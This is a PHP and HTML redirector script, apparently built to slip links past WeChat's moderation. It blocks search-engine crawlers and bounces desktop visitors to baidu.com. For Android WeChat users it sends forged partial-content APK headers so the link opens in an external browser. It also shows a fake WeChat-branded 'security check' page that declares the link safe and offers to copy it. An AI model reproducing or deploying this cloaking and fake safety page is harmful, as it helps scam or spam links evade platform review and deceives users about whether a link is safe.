<?php
function getClientIp()
{

    if(!empty($_SERVER["HTTP_CLIENT_IP"]))
    {
        $cip = $_SERVER["HTTP_CLIENT_IP"];
    }
    else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
    {
        $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    else if(!empty($_SERVER["REMOTE_ADDR"]))
    {
        $cip = $_SERVER["REMOTE_ADDR"];
    }
    else
    {
        $cip = '';
    }
    preg_match("/[\d\.]{7,15}/", $cip, $cips);
    $cip = isset($cips[0]) ? $cips[0] : 'unknown';
    unset($cips);

    return $cip;
}

/**
 * 获得客户端
 * 类型：微信，浏览器，APP，蜘蛛
 */
function get_client()
{
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
    if(strpos($userAgent, 'MicroMessenger') == true)
    {
        return 'wechat';
    }
    else if(strpos($userAgent, 'Browser') == true)
    {
        return 'browser';
    }
    else if(preg_match("/(googlebot|baiduspider|spider|360spider|bingbot)/i", $userAgent) == true)
    {
        return 'spider';
    }
    else if( preg_match("/(App@Client)/i", $userAgent) == true )
    {
        return 'app';
    }
    else
    {
        return false;
    }
}

function is_mobile()
{
    # 如果监测到是指定的浏览器之一则返回true
    $regex_match="/(nokia|iphone|android|ipad|motorola|^mot\-|softbank|foma|docomo|kddi|up\.browser|up\.link|";
    $regex_match .="htc|dopod|blazer|netfront|helio|hosin|huawei|novarra|CoolPad|webos|techfaith|palmsource|";
    $regex_match .="blackberry|alcatel|amoi|ktouch|nexian|samsung|^sam\-|s[cg]h|^lge|ericsson|philips|sagem|wellcom|bunjalloo|maui|";
    $regex_match .="symbian|smartphone|midp|wap|phone|windows ce|iemobile|^spice|^bird|^zte\-|longcos|pantech|gionee|^sie\-|portalmmm|";
    $regex_match .="jig\s browser|hiptop|^ucweb|^benq|haier|^lct|opera\s*mobi|opera\*mini|320x320|240x320|176x220";
    $regex_match .=")/i";

    # preg_match()方法功能为匹配字符，既第二个参数所含字符是否包含第一个参数所含字符，包含则返回1既true
    return preg_match($regex_match, strtolower($_SERVER['HTTP_USER_AGENT']));
}

function is_ios()
{
    if(strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') || strpos($_SERVER['HTTP_USER_AGENT'], 'iPad')){

        return true;

    } else {
    
        return false;
    }
}


if(time() > ($time+120))
{
    if($time!=123)
    {
        die;
    }   
}
if(md5(md5($time.'&dtmob@123')) != $secretkey )
{
    if($time!=123)
    {
        die;
    }
}

//无来源不访问
// if($_SERVER["HTTP_REFERER"])
// {
//     die;
// }
//屏蔽蜘蛛
if( empty($_SERVER['HTTP_USER_AGENT']) )
{
    die;
}
//屏蔽搜索引擎蜘蛛
if(preg_match("/(googlebot|baiduspider|sogou|360spider|bingbot)/i", $_SERVER['HTTP_USER_AGENT'])) {
    die;
}

if( !is_mobile() )
{
    header("Location: http://www.baidu.com/");
    die;
}
else
{
    #是微信
    if(get_client()=='wechat' || get_client()=='app')
    {
        #安卓做跳转 直接跳转
        if(is_ios())
        {
            if($is_cover=='0')
            {
                header("Location: ".$url);
                die;
            }
        }
        else
        {
            #别人家跳转地址注意保存
            #http://jt.zhnqiauto.com/jt.php?jt=http://www.baodu.com
            header("HTTP/1.0 206 Partial Content");
            header("Accept-Ranges: bytes 0-1/1");
            header("Connection: keep-alive");
            header("Content-Disposition: attachment;filename=1579.apk");
            header("Content-Type: text/plain;charset=UTF-8");
            header("X-Daa-Tunnel: hop_count=3");
            die;
         }
    }
    else
    {
        $ip = getClientIp();
        
        if($url) {
            header("Location: ".$url);
        }
        die;
    }
}
?>
<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=0">
    <title>安全检测</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.4/clipboard.min.js"></script>
    <style>
        .page *{ -webkit-user-select: none; -moz-user-select: none; -webkit-user-select: none; -o-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; -webkit-tap-highlight-color: rgba(0,0,0,0);}
        .page{position: fixed; top: 0; left: 0; right: 0; border: 0; background: #fff; width: 100%; height: 100%; font-family: PingFangSC-Regular, sans-serif; text-align: center;}
        .page .icon{ width: 100%; text-align: center; padding-top: 4em;}
        .page .icon img{ width: 6.4em;}
        .page .title{color: #000; text-align: center;font-size: 1.3em;font-weight: 700;padding: 0.6em 0em;}
        .page .url{color: #333; text-align: center; font-size: 1.1em; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; -webkit-line-clamp: 1; padding: 0em 1em; width: 80%; margin: 0 auto;}
        .page .txt{color: #333; text-align: center; font-size: 1.1em; padding: 0.2em 1em; width: 80%; margin: 0 auto;}
        .page .button{width: 90%;border: 1px solid #07c160;border-radius: 4px;padding: 0.5em;text-align: center;margin: 0 auto;color: #07c160;margin-top: 1.5em; font-size: 1.1em;}
        .page .copyright{position: absolute; bottom: 16px; font-size: 0.8em; text-align: center; width: 100%; color: #5f6b93;}

    </style>
</head>
<body>

<div class="page">
    <div class="icon">
        <img src="https://image.ghosttty.cn/images/icon.png"/>
    </div>
    <div class="title">安全链接</div>
    <div class="url"><?=$url;?></div>
    <div class="txt">该链接检测为安全链接，可以放心访问，注意好管好自己隐私。</div>

    <!-- <button class="button">点击直接访问</button> -->
    <button class="button" data-clipboard-text="<?=$url;?>">复制链接 浏览器打开</button>

    <div class="copyright">微信版权</div>
</div>


<script>

var clipboard = new ClipboardJS('.button');
clipboard.on('success', function(e) {
    alert("复制成功，请用浏览器打开");
    e.clearSelection();
});

clipboard.on('error', function(e) {
    alert("复制失败");
});




</script>
</body>
</body>
</html>
